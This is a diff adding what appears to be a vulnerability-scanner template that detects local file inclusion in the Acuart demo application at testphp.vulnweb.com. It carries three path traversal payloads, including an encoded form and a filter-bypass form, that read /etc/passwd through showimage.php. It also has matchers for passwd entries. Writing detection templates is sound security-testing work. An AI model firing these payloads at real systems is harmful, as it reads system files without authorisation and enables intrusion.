@@ -1,0 +1,29 @@
+id: acuart-lfi
+
+info:
+  name: Acuart (testphp.vulnweb.com) - LFI
+  author: Kalkaneus Team
+  severity: high
+  description: Local file inclusion in Acuart demo application
+  reference:
+    - http://testphp.vulnweb.com/
+  tags: lfi,acuart,testphp,file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/showimage.php?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/showimage.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/showimage.php?file=....//....//....//....//etc/passwd"
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "daemon:x:"
+        condition: or
